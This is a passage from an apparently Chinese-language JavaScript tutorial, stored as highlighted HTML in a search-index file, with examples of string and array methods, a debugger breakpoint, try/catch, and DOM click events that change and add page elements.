class="built_in">console</span>.log([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>].lastIndexOf(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string = <span class="built_in">String</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找字串</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.indexOf(<span class="string">&#x27;lo&#x27;</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.lastIndexOf(<span class="string">&#x27;o&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问元素</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.charAt(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.charCodeAt(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分割，可以接受负数，从后开始计算</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.slice(<span class="number">0</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="comment">// 分割，两个值的顺序无所谓，从小到大</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.substring(<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"><span class="comment">// 分割，第一个参数是位置，第二个参数是个数</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworld&quot;</span>.substr(<span class="number">3</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，函数接受一个文件名并返回后缀</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func1</span>(<span class="params">file</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 通过关键字 debugger 设置断电</span></span><br><span class="line">    <span class="keyword">debugger</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从后向前查找 .</span></span><br><span class="line">    index = file.lastIndexOf(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> file.slice(index + <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(func1(<span class="string">&quot;12.3456.txt&quot;</span>))</span><br><span class="line"><span class="built_in">console</span>.log(func1(<span class="string">&quot;12.3456.docx&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以指定分割符为边界进行分割</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloweorld&quot;</span>.split(<span class="string">&#x27;e&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 替换文本，可以用正则，也可以不用</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworldh&quot;</span>.replace(<span class="regexp">/^h/</span>, <span class="string">&#x27;w&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转换字母大小写</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworldh&quot;</span>.toLowerCase())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;helloworldh&quot;</span>.toUpperCase())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接受一段英文的语句，将除首单词外的所有单词首元素大写</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func2</span>(<span class="params">content</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 将字符串以空格切割成数组</span></span><br><span class="line">    <span class="keyword">let</span> l = content.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不遍历首元素，修改其它元素</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; l.length; ++i) &#123;</span><br><span class="line">        <span class="comment">// 取出第一个字符，转换成大写，再和出第一个字符外的其它进行拼接</span></span><br><span class="line">        l[i] = l[i].charAt(<span class="number">0</span>).toUpperCase() + l[i].slice(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> l.join(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(func2(<span class="string">&#x27;aaaa bbbb cccc dddd&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> m = <span class="number">20</span>, n = <span class="number">10</span>;</span><br><span class="line">random=<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*(m-n+<span class="number">1</span>)+n);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Math</span>.min(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mul</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;1111&quot;</span> * <span class="string">&quot;2222&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    mul(<span class="string">&quot;111&quot;</span>, <span class="string">&quot;aaa&quot;</span>)   </span><br><span class="line">    a = <span class="string">&quot;1111&quot;</span> * <span class="string">&quot;2222&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;1233&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DOM事件"><a href="#DOM事件" class="headerlink" title="DOM事件"></a>DOM事件</h2><p>HTML DOM 允许 JavaScript 对 HTML 事件作出反应：</p><h3 id="对事件作出反应"><a href="#对事件作出反应" class="headerlink" title="对事件作出反应"></a>对事件作出反应</h3><p>JavaScript 能够在事件发生时执行，比如当用户点击某个 HTML 元素时。</p><p>为了在用户点击元素时执行代码，请向 HTML 事件属性添加 JavaScript 代码：</p><h4 id="HTML-事件的例子："><a href="#HTML-事件的例子：" class="headerlink" title="HTML 事件的例子："></a>HTML 事件的例子：</h4><ul><li>当用户点击鼠标时</li><li>当网页加载后</li><li>当图像加载后</li><li>当鼠标移至元素上时</li><li>当输入字段被改变时</li><li>当 HTML 表单被提交时</li><li>当用户敲击按键时</li></ul><h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">&quot;changeText(this)&quot;</span>&gt;</span>请点击此文本！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">changeText</span>(<span class="params">id</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  id.innerHTML = <span class="string">&quot;谢谢！&quot;</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myonclick()&quot;</span>&gt;</span>修改节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;myonclick2()&quot;</span>&gt;</span>添加节点<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">myonclick</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 获取到 my-id 节点的元素</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> ol = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;my-id&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 通过 querySelector 可以设置十分复杂的选择器查找规则</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> test = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.my-id&gt;div&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 遍历该节点下的所有结点</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; ol.children.length; i++) &#123;</span></span><br><span class="line"><span class="javascript">                ol.children[i].innerHTML = <span class="string">&quot;新的内容&quot;</span> + i;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (i == <span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">                    ol.children[i].style.backgroundColor = <span class="string">&#x27;red&#x27;</span>;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">myonclick2</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> button = <span class="built_in">document</span>.createElement(<span class="string">&#x27;button&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            button.innerHTML = <span class="string">&#x27;新的按钮&#x27;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.body.appendChild(button);</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
